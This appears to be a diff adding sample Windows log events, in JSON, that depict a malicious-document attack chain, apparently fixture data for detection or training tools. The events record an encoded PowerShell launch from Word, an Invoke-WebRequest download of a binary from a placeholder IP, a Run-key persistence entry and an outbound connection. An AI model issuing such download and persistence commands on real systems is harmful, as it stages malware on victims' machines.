@@ -1,0 +1,56 @@
+[
+  {
+    "event_id": "EVT-SAMPLE-01",
+    "timestamp": "2026-10-08T12:30:00+00:00",
+    "source": "Sysmon",
+    "event_type": "Process Creation",
+    "computer": "WIN-SAMPLE-01",
+    "user_name": "analyst",
+    "process_name": "powershell.exe",
+    "command_line": "powershell.exe -NoP -EncodedCommand SQBuAHYAbwBrAGUA",
+    "parent_process": "WINWORD.EXE->powershell.exe",
+    "process_id": "4001",
+    "logon_id": "0x101"
+  },
+  {
+    "event_id": "EVT-SAMPLE-02",
+    "timestamp": "2026-10-08T12:30:18+00:00",
+    "source": "PowerShell",
+    "event_type": "PowerShell ScriptBlock",
+    "computer": "WIN-SAMPLE-01",
+    "user_name": "analyst",
+    "process_name": "powershell.exe",
+    "command_line": "Invoke-WebRequest https://203.0.113.50/update.bin -OutFile C:\\ProgramData\\update.bin",
+    "parent_process": "WINWORD.EXE->powershell.exe",
+    "process_id": "4001",
+    "logon_id": "0x101"
+  },
+  {
+    "event_id": "EVT-SAMPLE-03",
+    "timestamp": "2026-10-08T12:30:42+00:00",
+    "source": "Security",
+    "event_type": "Registry Modification",
+    "computer": "WIN-SAMPLE-01",
+    "user_name": "analyst",
+    "process_name": "powershell.exe",
+    "command_line": "Set-ItemProperty",
+    "parent_process": "WINWORD.EXE->powershell.exe",
+    "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+    "process_id": "4001",
+    "logon_id": "0x101"
+  },
+  {
+    "event_id": "EVT-SAMPLE-04",
+    "timestamp": "2026-10-08T12:31:00+00:00",
+    "source": "Sysmon",
+    "event_type": "Network Connection",
+    "computer": "WIN-SAMPLE-01",
+    "user_name": "analyst",
+    "process_name": "powershell.exe",
+    "command_line": "TCP connection",
+    "destination_ip": "203.0.113.50",
+    "parent_process": "WINWORD.EXE->powershell.exe",
+    "process_id": "4001",
+    "logon_id": "0x101"
+  }
+]
